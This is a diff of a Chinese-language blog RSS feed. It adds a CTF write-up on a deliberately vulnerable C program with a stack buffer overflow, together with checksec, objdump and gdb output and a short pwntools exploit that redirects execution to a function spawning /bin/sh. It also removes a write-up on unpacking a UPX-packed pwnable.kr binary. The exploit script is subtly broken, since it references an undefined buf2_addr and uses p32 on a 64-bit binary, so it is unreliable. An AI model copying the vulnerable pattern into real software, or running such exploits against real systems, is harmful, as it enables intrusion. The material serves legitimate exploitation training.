@@ -4,9 +4,115 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Mon, 03 Apr 2023 07:32:59 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 03 Apr 2023 07:33:50 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[PwnMe-challenges-train-sniper-01]]></title>
+            <guid>330571c9c2c24e97b19e1a564bca38ca</guid>
+            <pubDate>Mon, 03 Apr 2023 07:01:38 GMT</pubDate>
+            <content:encoded><![CDATA[<p><strong>漏洞程序源码如下：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+
+<span class="hljs-comment">// 栈溢出后执行的函数</span>
+<span class="hljs-type">void</span> <span class="hljs-title function_">bingo</span><span class="hljs-params">()</span>{
+    system(<span class="hljs-string">"/bin/sh"</span>); <span class="hljs-comment">// 调用 system 函数启动 /bin/sh 来获取 shell</span>
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{
+    <span class="hljs-type">char</span> buffer[<span class="hljs-number">36</span>] = {<span class="hljs-number">0</span>}; <span class="hljs-comment">// 定义 36 个字符(字节)长度的字符数组 , 并全部初始化为 0</span>
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Tell my why : "</span>);
+    <span class="hljs-comment">/* 溢出漏洞产生的原因就是因为 read 函数并没有对 buffer 数组的范围进行检查 
+     * 如果我们向标准输入流中输入了超出 buffer 范围 (36个字节) 的数据 , 那么写操作并不会停止 , 而是会继续向内存中写入数据 , 而这些数据就是由我们控制的
+     * 我们知道 , buffer 数组是保存在内存中的栈段中的 , 而 main 函数的返回地址也是保存在栈段中的
+     * 因此 , 我们只需要控制写入的数据 , 将 main 函数的返回地址覆盖
+     * 这样 , 在主函数执行结束后 , 会 pop 栈中保存的主函数的返回地址 (事实上已经被我们写入的数据覆盖) 到 eip 寄存器中
+     * cpu 就会不会认为程序已经结束 , 而是继续根据 eip 寄存器指向的内存取指令执行 , 这样我们就达到了可以任意控制程序流程的目的
+     * 因此 , 我们为了能获取一个 shell , 我们需要将主函数的返回地址覆盖为 bingo 函数的地址
+     * 然后程序继续执行之后遇到 return 0 就会直接跳转到 bingo 函数 , 从而运行 /bin/sh , 我们就可以得到目标主机的 shell
+     * 由于时间关系 , 这里所有的操作都在本机进行 , 远程操作也是同样的道理 , 因此不再赘述
+     */</span>
+    read(<span class="hljs-number">0</span>, buffer, <span class="hljs-number">0xFF</span>); <span class="hljs-comment">// 使用 read 函数将标准输入流中的数据复制到 buffer 字符数组</span>
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Good boy : %s\n"</span>, buffer); <span class="hljs-comment">// 打印字符数组的长度</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 主函数返回</span>
+}</code></pre></div>
+<p><strong>编译选项如下：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-section">a.out:hello.c</span>
+    gcc -g -fno-stack-protector hello.c
+<span class="hljs-section">clean:</span>
+    rm ./a.out</code></pre></div>
+<p><strong>checksec</strong></p>
+<div><pre class="hljs"><code>└─$ checksec --file=./a.out
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols        No    0               2               ./a.out</code></pre></div>
+<p><strong>objdump</strong></p>
+<div><pre class="hljs"><code>└─$ objdump -t -j <span class="hljs-selector-class">.text</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.out</span> 
+
+<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.out</span>:     file format elf64-x86-<span class="hljs-number">64</span>
+
+SYMBOL TABLE:
+<span class="hljs-number">0000000000400500</span> l    d  <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              <span class="hljs-selector-class">.text</span>
+<span class="hljs-number">0000000000400530</span> l     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              deregister_tm_clones
+<span class="hljs-number">0000000000400560</span> l     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              register_tm_clones
+<span class="hljs-number">00000000004005</span>a0 l     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              __do_global_dtors_aux
+<span class="hljs-number">00000000004005</span>c0 l     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              frame_dummy
+<span class="hljs-number">00000000004006</span>e0 g     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000002</span>              __libc_csu_fini
+<span class="hljs-number">00000000004005</span>ed g     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000010</span>              bingo
+<span class="hljs-number">0000000000400670</span> g     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000065</span>              __libc_csu_init
+<span class="hljs-number">0000000000400500</span> g     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">000000000000002</span>a              _start
+<span class="hljs-number">00000000004005</span>fd g     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">000000000000006</span>c              main</code></pre></div>
+<p><strong>使用gdb进行调试</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">gdb-peda$ </span><span class="language-bash">disass main</span>
+Dump of assembler code for function main:
+   0x00000000004005fd &lt;+0&gt;:     push   rbp
+   0x00000000004005fe &lt;+1&gt;:     mov    rbp,rsp
+   0x0000000000400601 &lt;+4&gt;:     sub    rsp,0x30
+   0x0000000000400605 &lt;+8&gt;:     mov    QWORD PTR [rbp-0x30],0x0
+   0x000000000040060d &lt;+16&gt;:    mov    QWORD PTR [rbp-0x28],0x0
+   0x0000000000400615 &lt;+24&gt;:    mov    QWORD PTR [rbp-0x20],0x0
+   0x000000000040061d &lt;+32&gt;:    mov    QWORD PTR [rbp-0x18],0x0
+   0x0000000000400625 &lt;+40&gt;:    mov    DWORD PTR [rbp-0x10],0x0
+   0x000000000040062c &lt;+47&gt;:    mov    edi,0x4006fc
+   0x0000000000400631 &lt;+52&gt;:    call   0x4004a0 &lt;puts@plt&gt;
+   0x0000000000400636 &lt;+57&gt;:    lea    rax,[rbp-0x30]
+   0x000000000040063a &lt;+61&gt;:    mov    edx,0xff
+   0x000000000040063f &lt;+66&gt;:    mov    rsi,rax
+   0x0000000000400642 &lt;+69&gt;:    mov    edi,0x0
+   0x0000000000400647 &lt;+74&gt;:    call   0x4004d0 &lt;read@plt&gt;
+   0x000000000040064c &lt;+79&gt;:    lea    rax,[rbp-0x30]
+   0x0000000000400650 &lt;+83&gt;:    mov    rsi,rax
+   0x0000000000400653 &lt;+86&gt;:    mov    edi,0x40070b
+   0x0000000000400658 &lt;+91&gt;:    mov    eax,0x0
+   0x000000000040065d &lt;+96&gt;:    call   0x4004c0 &lt;printf@plt&gt;
+   0x0000000000400662 &lt;+101&gt;:   mov    eax,0x0
+   0x0000000000400667 &lt;+106&gt;:   leave
+   0x0000000000400668 &lt;+107&gt;:   ret
+End of assembler dump.</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-meta">gdb-peda$ </span><span class="language-bash">disass bingo</span>
+Dump of assembler code for function bingo:
+   0x00000000004005ed &lt;+0&gt;:     push   rbp
+   0x00000000004005ee &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000004005f1 &lt;+4&gt;:     mov    edi,0x4006f4
+   0x00000000004005f6 &lt;+9&gt;:     call   0x4004b0 &lt;system@plt&gt;
+   0x00000000004005fb &lt;+14&gt;:    pop    rbp
+   0x00000000004005fc &lt;+15&gt;:    ret
+End of assembler dump.</code></pre></div>
+<p>从<code>main</code>函数中可以看到，存储输入数据的偏移地址为<code>[rbp-0x30]</code></p>
+<p><code>bingo</code>函数的地址为<code>0x4005ed</code></p>
+<p>据此构造利用脚本，如下：</p>
+<p>由于该程序为64位，则段基地址长度为8位，则覆盖长度为48+8=56</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+sh = process(<span class="hljs-string">'./a.out'</span>)
+key = <span class="hljs-number">0x4005ed</span>
+
+sh.sendline(<span class="hljs-string">b'a'</span>*<span class="hljs-number">56</span> + p32(buf2_addr))
+sh.interactive()</code></pre></div>
+<p><img src="/_resources/a8ac085434394fd58cec838bc4c36c4b.png" /></p>
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[vulhub    DIGITALWORLD.LOCAL: BRAVERY]]></title>
             <guid>51671c3f6b824ed59e3b07ac6d5f7558</guid>
@@ -1511,53 +1617,6 @@ End of assembler dump.</code></pre></div>
 <hr />
 <p>执行exp得到flag，如下图所示：</p>
 <img src="/_resources/a95a61dbeba2422686840960aaef7611.png" alt="db8b2fc0245bad16909810e9269ea724.png" width="933" height="556" class="jop-noMdConv" />]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[pwnable--flag--(reverse)]]></title>
-            <guid>eaa12948723d4268b116c2375b2313b6</guid>
-            <pubDate>Tue, 12 Apr 2022 14:21:34 GMT</pubDate>
-            <content:encoded><![CDATA[<h3 id="psxxd十六进制编辑器kali">PS:xxd十六进制编辑器–kali</h3>
-<hr />
-<div><pre class="hljs"><code>Papa brought me a<span class="hljs-built_in"> packed </span>present! let's open it.
-
-Download<span class="hljs-keyword"> :</span> http://pwnable.kr/bin/flag
-
-This is reversing task. all you need is binary</code></pre></div>
-<p><strong>下载文件并检查：</strong></p>
-<div><pre class="hljs"><code>┌──(root💀kali)-[~/Desktop/pwnable]
-└─<span class="hljs-comment"># checksec flag </span>
-[*] <span class="hljs-string">'/root/Desktop/pwnable/flag'</span>
-    Arch:     amd64-64-little
-    RELRO:    No RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x400000)
-    RWX:      Has RWX segments
-    Packer:   Packed with UPX
-                                                                                                                                                                      
-┌──(root💀kali)-[~/Desktop/pwnable]
-└─<span class="hljs-comment"># file flag              </span>
-flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header</code></pre></div>
-<p><strong>运行一下flag</strong></p>
-<div><pre class="hljs"><code>┌──(root💀kali)-[~<span class="hljs-regexp">/Desktop/</span>pwnable]
-└─<span class="hljs-comment"># ./flag </span>
-I will malloc() and strcpy the flag there. take it.</code></pre></div>
-<p><strong>用IDA打开，发现参数非常少，怀疑加壳，使用工具检测：</strong></p>
-<div><pre class="hljs"><code>└─# xxd flag|tail                                                                                                                                                 1 ⨯
-00051d20: 77c4 8a1d b0f1 d302 6973 b0a0 c023 8d6d  w.......is...#.m
-00051d30: 616b 424e 9948 2c86 8ec3 0232 2a45 db17  akBN.H,....2*E..
-00051d40: 0981 0be3 b91f 2656 2211 c349 4608 1fb8  ......&amp;V"..IF...
-00051d50: 3b9d c5c0 e820 1e5f 5f00 01a2 30b0 9943  ;.... .__...0..C
-00051d60: e968 58b1 f464 65e3 b58b 137a 54de 7375  .hX..de....zT.su
-00051d70: 6022 5d52 d7e5 00bb c625 8581 116d 4992  `"]R.....%...mI.
-00051d80: 9041 9f00 a092 24ff 0000 0000 5550 5821  .A....$.....UPX!
-00051d90: 0000 0000 5550 5821 0d16 0807 19cc 204a  ....UPX!...... J
-00051da0: dbd8 21c5 3145 0100 5e70 0000 217c 0d00  ..!.1E..^p..!|..
-00051db0: 4919 0089 bc00 0000                      I.......</code></pre></div>
-<p>发现是UPX加壳，在linux下使用 <code>upx -d flag</code> 脱壳，然后使用IDA打开</p>
-<img src="/_resources/c9c2f67ffee345549042aa1c05c9dd57.png" alt="ee86bb80ab597e956ad0a23c8b524869.png" width="1056" height="521" class="jop-noMdConv" />
-<p><strong>双击flag跳转至下图，得到flag</strong></p>
-<img src="/_resources/a4f5f036ab244e4e81d3af2a869fc19e.png" alt="4a8e2574afe63ed666996c8f2306b19a.png" width="993" height="571" class="jop-noMdConv" />]]></content:encoded>
         </item>
     </channel>
 </rss>
